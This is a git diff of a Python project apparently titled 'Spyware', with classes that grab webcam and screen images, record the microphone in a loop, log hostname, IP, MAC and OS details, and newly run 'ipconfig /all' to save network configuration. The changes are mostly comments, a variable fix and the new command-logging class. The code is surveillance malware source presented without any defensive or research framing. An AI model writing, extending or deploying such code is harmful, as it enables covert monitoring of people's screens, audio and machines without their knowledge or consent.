@@ -21,9 +21,11 @@ class BaseClass:
         self.currentDate = date.today()
         self.currentTime = datetime.now()
 
+        # Base definition of folder_path
         self.folder_path_screenshots = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Screenshots"
         self.folder_path_soundfiles = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Soundfiles"
         self.folder_path_sys_info = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Systeminformation"
+        self.folder_path_cmd_prompts = r"C:\Users\deniz\PycharmProjects\Spyware\Features\CMDPrompts"
 
 class WEBCAMERA(BaseClass):
     def __init__(self):
@@ -47,7 +49,7 @@ class SCREENSHOTS(BaseClass):
     def __init__(self):
         super().__init__() # Call the base class __init__ method
 
-        # Constants for variables
+        # Constants
         self.counter = 0
         self.sleepAmount = 1
 
@@ -63,7 +65,7 @@ class SCREENSHOTS(BaseClass):
             if not os.path.exists(self.folder_path):
                 os.makedirs(self.folder_path)
 
-            # Save captured audio to the file path
+            # Save captured screenshots to the file path
             file_path = os.path.join(self.folder_path, self.output_file_name)
             image.save(file_path)
 
@@ -83,6 +85,7 @@ class MICROPHONE(BaseClass):
 
     def microphone(self):
         while True:
+            # Record
             audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)
 
             if not os.path.exists(self.folder_path):
@@ -110,6 +113,9 @@ class SYS_INFO(BaseClass):
         # Mac address
         self.mac_address = get_mac_address()
 
+        # Default value
+        self.os_info = None
+
     def system_information(self):
         platform_switch = {
             # platform.win32_ver(release='', version='', csd='', ptype='')
@@ -121,17 +127,18 @@ class SYS_INFO(BaseClass):
         }
 
         try:
+            # Get hosts platform system and the matching keys in the dictionary
             platform_name = platform.system()
             get_os = platform_switch.get(platform_name)
 
             if get_os:
-                os_info = get_os()  # Call the lambda function
+                self.os_info = get_os()  # Call the lambda function
             else:
                 raise Exception("Unsupported platform")
-
         except Exception as e:
             print(f"An error occurred: {str(e)}")
 
+        # Open/Create file path
         with open(os.path.join(self.folder_path, self.output_file_name), "a") as f:
             hostname = socket.gethostname()
             IPAddr = socket.gethostbyname(hostname)
@@ -146,7 +153,7 @@ class SYS_INFO(BaseClass):
 
             f.write(f"Processor Info: {platform.processor()}\n")
             f.write(f"OS Info: {platform.system()}\n")
-            f.write(f"Detailed OS Info: {os_info}\n")
+            f.write(f"Detailed OS Info: {self.os_info}\n")
             f.write(f"Machine Info: {platform.machine()}\n")
             f.write(f"Hostname: {hostname}\n")
             f.write(f"Private IP Address: {IPAddr}\n")
@@ -156,9 +163,34 @@ class SYS_INFO(BaseClass):
 
             f.write("------------------------------END------------------------------\n\n\n")
 
-class CMD(BaseClass):
+class CMD_PROMPTS(BaseClass):
     def __init__(self):
-        pass
+        super().__init__()  # Call the base class __init__ method
 
-    def cmd_prompts(self):
-        pass
+        # Folder path and filename
+        self.folder_path = self.folder_path_cmd_prompts
+        self.output_file_name = "CMDPrompts.txt"
+
+        # Default value
+        self.ipconfig_all_data = None
+
+    def ipconfig_all(self):
+        try:
+            # Execute the ipconfig /all command
+            self.ipconfig_all_data = subprocess.check_output(['ipconfig', '/all'], text=True)
+        except subprocess.CalledProcessError as e:
+            print("Failed to run command. Return code:", e.returncode)
+            print("Output:", e.output)
+
+        except Exception as e:
+            print("An error occurred:", str(e))
+
+        # Open/Create file path
+        with open(os.path.join(self.folder_path, self.output_file_name), "a") as f:
+            f.write("-----------------------------BEGIN-----------------------------\n")
+
+            f.write(f"{self.ipconfig_all_data}\n\n\n")
+
+            f.write(f"Current date: {self.currentDate} || Current time: {self.currentTime}\n")
+
+            f.write("------------------------------END------------------------------\n\n\n")
